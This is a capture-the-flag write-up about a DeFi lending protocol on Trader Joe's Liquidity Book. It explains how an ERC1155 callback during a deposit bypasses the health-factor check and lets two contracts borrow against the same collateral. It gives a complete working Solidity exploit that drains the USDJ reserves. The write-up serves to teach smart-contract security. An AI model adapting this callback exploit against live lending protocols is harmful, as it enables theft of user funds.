# Joe's Lending Mirage: When Callbacks Strike Back

In this CTF challenge, we explore a vulnerability in a DeFi lending protocol that allows an attacker to drain the protocol's USDJ reserves. The challenge demonstrates how seemingly minor implementation details around ERC1155 callbacks can lead to significant security issues.

## Challenge Overview

The challenge presents us with Joe's new lending protocol, a DeFi system built on top of Trader Joe's V2 Liquidity Book implementation. At its core, the protocol implements a collateralized lending system where users can:
- Deposit Trader Joe LP tokens (specifically from USDT/USDC pairs) as collateral
- Borrow USDJ stablecoins against their deposited collateral
- Earn interest on their deposits
- Get liquidated if their position becomes unhealthy

The protocol implements several standard DeFi lending safeguards:
- A health factor of 1.25, requiring positions to maintain 125% collateralization
- A collateral factor of 0.8, meaning users can borrow up to 80% of their collateral value
- Dynamic interest rate mechanics with a 5% annual rate
- Liquidation functionality for unhealthy positions
- Reentrancy protection using OpenZeppelin's ReentrancyGuard
- Price oracles for accurate collateral valuation

The challenge setup provides players with:
- 1000 USDT and 1000 USDC as initial capital
- Access to the protocol where someone has already deposited LP tokens and borrowed against them
- The complete source code of the protocol and challenge setup

The goal is to drain more than 1900 USDJ from the protocol. This should be mathematically impossible under normal circumstances, as:
1. With 1000 USDT + 1000 USDC initial capital, we can create LP tokens worth ~2000 USD
2. Given the collateral factor of 0.8, we should only be able to borrow up to 1600 USDJ (80% of 2000)
3. The health factor of 1.25 further restricts our borrowing capability
4. There are no price oracle manipulation vectors as the oracles are external to the challenge

This mathematical impossibility suggests there must be a subtle implementation flaw in the protocol's logic.

## Protocol Analysis

The core contract `JoeLending.sol` implements a sophisticated lending protocol built on ERC1155 tokens. Let's dive deep into its key components and mechanisms.

### Collateral Management

The protocol uses ERC1155 tokens to represent deposited LP positions. This is implemented through several interconnected systems:

```solidity
mapping(address => mapping(uint256 => uint256)) public _borrowedLb;
mapping(address => mapping(uint256 => uint256)) public _borrowedUsdj;
mapping(address => EnumerableSet.UintSet) internal _borrowedIds;
mapping(address => EnumerableSet.UintSet) internal _collateralIds;
```

These state variables track:
- The amount of LP tokens borrowed per user and ID
- The amount of USDJ borrowed against each position
- The set of IDs a user has borrowed against
- The set of IDs a user has deposited as collateral

### Deposit Mechanism

The deposit process involves several steps:

```solidity
function deposit(uint256[] calldata ids, uint256[] calldata amounts) external nonReentrant {
    _processMintAndDeposit(msg.sender, ids, amounts);
    emit Deposited(msg.sender, ids, amounts);
}

function _processMintAndDeposit(address to, uint256[] memory ids, uint256[] memory amounts) internal {
    require(ids.length == amounts.length, "invalid deposit param length");

    uint256 exchangeRateMantissa;
    uint256[] memory mintTokens = new uint256[](ids.length);

    for (uint256 i; i < ids.length; i++) {
        _accrueInterest(ids[i]);
        _incurInterest(to, ids[i]);
        exchangeRateMantissa = _getExchangeRateMantissa(ids[i]);
        mintTokens[i] = amounts[i] * _expScale / exchangeRateMantissa;
        _totalSupplies[ids[i]] += mintTokens[i];
        _totalLb[ids[i]] += amounts[i];
        _collateralIds[to].add(ids[i]);
    }

    _lbPair.batchTransferFrom(to, address(this), ids, amounts);

    for (uint256 i; i < ids.length; i++) {
        _mint(to, ids[i], mintTokens[i], "");
    }
}
```

Key observations about the deposit process:
1. It's protected by a reentrancy guard
2. Interest is accrued before any state changes
3. Exchange rates are calculated to determine the amount of ERC1155 tokens to mint
4. LP tokens are transferred before minting ERC1155 tokens
5. The user receives ERC1155 tokens representing their deposit

### Borrowing System

The borrowing mechanism includes several security checks:

```solidity
function _borrow(address to, uint256[] memory ids, uint256[] memory amounts) internal {
    require(ids.length == amounts.length, "invalid borrow param length");
    (, uint256 shortfall) = hypotheticalHealthCheck(to, ids, amounts, RedeemOrborrow.BORROW);
    require(shortfall == 0, "borrow hypotheticalHealthCheck failed");
    uint256 usdjToTransfer = 0;
    
    for (uint256 i; i < ids.length; i++) {
        _accrueInterest(ids[i]);
        _incurInterest(to, ids[i]);
        _borrowedIds[to].add(ids[i]);
        
        uint256 borrowWorthMantissa = getAssetPrice(USDJ) * amounts[i];
        uint256 lbBalance = (balanceOf(to, ids[i]) * _getExchangeRateMantissa(ids[i]) / _expScale);
        uint256 collateralWorthMantissa = _getLiquidityValueMantissa(ids[i], lbBalance);
        uint256 lbAmount = (borrowWorthMantissa * lbBalance + (collateralWorthMantissa - 1)) / collateralWorthMantissa;
        
        _borrowedLb[to][ids[i]] += lbAmount;
        _borrowedUsdj[to][ids[i]] += amounts[i];
        _totalBorrowedLb[ids[i]] += lbAmount;
        _totalLb[ids[i]] -= lbAmount;
        _totalBorrowedUsdj[ids[i]] += amounts[i];
        usdjToTransfer += amounts[i];
    }

    USDJ.transfer(to, usdjToTransfer);
}
```

The borrowing process includes:
1. Health factor validation through `hypotheticalHealthCheck`
2. Interest accrual before state changes
3. Complex calculations to determine the equivalent LP token amount for the borrowed USDJ
4. Updates to both user and global state variables
5. Transfer of borrowed USDJ to the user

### Health Factor Calculation

The protocol implements a sophisticated health check system:

```solidity
function _getHealthFactorMantissa(address user) internal view returns (uint256) {
    uint256 userCollateralWorthMantissa = 0;
    uint256 userBorrowWorthMantissa = 0;

    for (uint256 i; i < _borrowedIds[user].length(); i++) {
        uint256 id = _borrowedIds[user].at(i);
        userBorrowWorthMantissa += getAssetPrice(USDJ) * _borrowedUsdj[user][id];
    }
    
    for (uint256 i; i < _collateralIds[user].length(); i++) {
        uint256 id = _collateralIds[user].at(i);
        userCollateralWorthMantissa += (
            _getLiquidityValueMantissa(id, _lbPair.totalSupply(id)) / _lbPair.totalSupply(id)
                * _getExchangeRateMantissa(id) * balanceOf(user, id) / _expScale
        ) - _getLiquidityValueMantissa(id, _accruedInterest[user][id]);
    }

    if (userBorrowWorthMantissa == 0) {
        return type(uint256).max;
    }

    return userCollateralWorthMantissa * _expScale / userBorrowWorthMantissa;
}
```

The health factor calculation:
1. Sums up all borrowed amounts converted to USD
2. Calculates the total collateral value considering LP token prices
3. Accounts for accrued interest
4. Returns the ratio of collateral to borrowed amount

## The Vulnerability

The key vulnerability lies in the interaction between ERC1155's callback mechanism and the protocol's health factor checks. Let's look at the relevant code:

```solidity
function _update(address from, address to, uint256[] memory ids, uint256[] memory values)
    internal
    virtual
    override
{
    super._update(from, to, ids, values);
    if (from != address(0) && _reentrancyGuardEntered() != true) {
        require(_getHealthFactorMantissa(from) >= BASE_HEALTH_FACTOR, "health factor too low");
    }
}
```

The contract inherits from OpenZeppelin's ERC1155 implementation, which includes callbacks when tokens are transferred. The `_update` function checks the health factor after transfers, but has two important exceptions:
1. When `from` is the zero address (minting)
2. When the reentrancy guard is active

However, during an ERC1155 callback, we can perform a transfer that bypasses the health factor check because the reentrancy guard is active from the initial deposit function.

## The Exploit

The vulnerability in the protocol centers around the interaction between ERC1155 callbacks and the health factor checks. We can exploit this to effectively "duplicate" our borrowing power across multiple accounts. Let's break down the attack step by step.

### Exploit Setup

The exploit requires two contracts:
1. Main exploit contract that initiates the attack
2. Secondary contract (Exploit2) that receives transferred tokens

```solidity
contract Exploit {
    Challenge private immutable CHALLENGE;
    Exploit2 private immutable EXPLOIT2;
    uint256 private counter;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
        EXPLOIT2 = new Exploit2(challenge);
    }
}
```

### Attack Flow

1. Initial Setup and LP Token Creation:
```solidity
// Transfer initial tokens to the pair
usdc.transfer(address(pair), 1000e6);
usdt.transfer(address(pair), 1000e6);

// Create LP tokens
bytes32[] memory liquidityConfig_init = new bytes32[](1);
liquidityConfig_init[0] = LiquidityConfigurations.encodeParams(1e18, 1e18, pair.getActiveId());
pair.mint(address(this), liquidityConfig_init, address(this));
```

2. First Deposit and Initial Borrowing:
```solidity
// Deposit most LP tokens, keeping a small amount
amounts_init[0] = pair.balanceOf(address(this), pair.getActiveId()) - 1000;
joe_lending.deposit(ids_init, amounts_init);

// Send some LP tokens to second contract
amounts_init[0] = 100;
pair.batchTransferFrom(address(this), address(EXPLOIT2), ids_init, amounts_init);
EXPLOIT2.exploit_pre();

// Borrow maximum USDJ
amounts_init[0] = 1000e18;
joe_lending.borrow(ids_init, amounts_init);
```

3. The Critical Callback Exploitation:
```solidity
function onERC1155Received(
    address operator,
    address from,
    uint256 id,
    uint256 value,
    bytes calldata data
) external returns (bytes4) {
    counter++;

    if (counter == 2) {
        // During the callback from a small deposit, transfer all tokens
        JoeLending joe_lending = CHALLENGE.JOE_LENDING();
        joe_lending.safeTransferFrom(
            address(this), 
            address(EXPLOIT2), 
            id, 
            joe_lending.balanceOf(address(this), id), 
            ""
        );
    }
    return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
}
```

4. Second Contract's Actions:
```solidity
contract Exploit2 {
    function exploit_pre() external {
        // Deposit received LP tokens
        uint256[] memory ids_init = new uint256[](1);
        ids_init[0] = pair.getActiveId();
        uint256[] memory amounts_init = new uint256[](1);
        pair.approveForAll(address(joe_lending), true);
        amounts_init[0] = pair.balanceOf(address(this), pair.getActiveId());
        joe_lending.deposit(ids_init, amounts_init);
    }

    function exploit_post(address player) external {
        // Borrow maximum USDJ with transferred tokens
        uint256[] memory amounts_init = new uint256[](1);
        amounts_init[0] = 1000e18;
        joe_lending.borrow(ids_init, amounts_init);
        usdj.transfer(player, usdj.balanceOf(address(this)));
    }
}
```

### Why It Works

The exploit succeeds because:
1. During the small deposit's ERC1155 callback, the reentrancy guard is active
2. This means the `_update` function won't check health factors during the token transfer
3. The second contract receives the tokens without any health factor validation
4. Both contracts can now borrow against the same underlying collateral
5. The protocol's accounting system sees these as separate positions, allowing us to exceed the normal borrowing limit

The key insight is that the reentrancy guard, intended to prevent recursive calls, actually creates a safe window for transferring tokens without health factor validation. This allows us to create multiple borrowing positions backed by effectively the same collateral.

## Complete Solution

The full solution requires two contracts:
1. Main exploit contract that handles the initial setup and deposit
2. Secondary contract that receives the transferred tokens and performs additional borrowing

Below is the complete solution:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-ctf/CTFSolver.sol";
import "src/Challenge.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract Exploit2 {
    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4) {
        revert("foo2");
        return bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"));
    }

    function exploit_pre() external {
        ILBPair pair = CHALLENGE.PAIR_USDT_USDC();
        JoeLending joe_lending = CHALLENGE.JOE_LENDING();

        uint256[] memory ids_init = new uint256[](1);
        ids_init[0] = pair.getActiveId();
        uint256[] memory amounts_init = new uint256[](1);
        pair.approveForAll(address(joe_lending), true);
        amounts_init[0] = pair.balanceOf(address(this), pair.getActiveId());
        joe_lending.deposit(ids_init, amounts_init);
    }

    function exploit_post(address player) external {
        ERC20 usdj = CHALLENGE.USDJ();
        JoeLending joe_lending = CHALLENGE.JOE_LENDING();
        ILBPair pair = CHALLENGE.PAIR_USDT_USDC();
        uint256[] memory ids_init = new uint256[](1);
        ids_init[0] = pair.getActiveId();
        uint256[] memory amounts_init = new uint256[](1);
        amounts_init[0] = 1000e18;
        joe_lending.borrow(ids_init, amounts_init);
        usdj.transfer(player, usdj.balanceOf(address(this)));
    }
}

contract Exploit {
    Challenge private immutable CHALLENGE;
    Exploit2 private immutable EXPLOIT2;
    uint256 private counter;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
        EXPLOIT2 = new Exploit2(challenge);
    }

    receive() external payable {}

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        counter++;

        if (counter == 2) {
            JoeLending joe_lending = CHALLENGE.JOE_LENDING();
            joe_lending.safeTransferFrom(address(this), address(EXPLOIT2), id, joe_lending.balanceOf(address(this), id), "");
        }
        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4) {
        revert("foo2");
        return bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"));
    }

    function exploit(address payable player) external {
        ERC20 usdc = CHALLENGE.USDC();
        ERC20 usdt = CHALLENGE.USDT();
        ERC20 usdj = CHALLENGE.USDJ();
        ILBPair pair = CHALLENGE.PAIR_USDT_USDC();
        JoeLending joe_lending = CHALLENGE.JOE_LENDING();

        usdc.transfer(address(pair), 1000e6);
        usdt.transfer(address(pair), 1000e6);
        bytes32[] memory liquidityConfig_init = new bytes32[](1);
        liquidityConfig_init[0] = LiquidityConfigurations.encodeParams(1e18, 1e18, pair.getActiveId());
        pair.mint(address(this), liquidityConfig_init, address(this));
        uint256[] memory ids_init = new uint256[](1);
        ids_init[0] = pair.getActiveId();
        uint256[] memory amounts_init = new uint256[](1);
        pair.approveForAll(address(joe_lending), true);
        amounts_init[0] = pair.balanceOf(address(this), pair.getActiveId()) - 1000;
        joe_lending.deposit(ids_init, amounts_init);

        amounts_init[0] = 100;
        pair.batchTransferFrom(address(this), address(EXPLOIT2), ids_init, amounts_init);
        EXPLOIT2.exploit_pre();

        amounts_init[0] = 1000e18;
        joe_lending.borrow(ids_init, amounts_init);

        amounts_init[0] = 100;
        joe_lending.deposit(ids_init, amounts_init);

        usdj.transfer(player, usdj.balanceOf(address(this)));

        EXPLOIT2.exploit_post(player);
    }
}

contract Solve is CTFSolver {
    function solve(address challengeAddress, address player) internal override {
        Challenge challenge = Challenge(challengeAddress);
        ERC20 usdc = challenge.USDC();
        ERC20 usdt = challenge.USDT();

        Exploit exploit = new Exploit(challenge);
        usdt.transfer(address(exploit), usdt.balanceOf(player));
        usdc.transfer(address(exploit), usdc.balanceOf(player));
        exploit.exploit(payable(player));
    }
}
```

## Key Takeaways

1. ERC1155 callbacks can be a source of complex vulnerabilities when combined with other protocol mechanics
2. Health factor checks should be consistent across all token transfer paths
3. Reentrancy guards don't protect against all forms of callback-based attacks
4. When implementing token standards with callbacks, carefully consider how they interact with protocol invariants

This challenge demonstrates how even well-protected protocols can be vulnerable to attacks that leverage standard token callbacks in unexpected ways.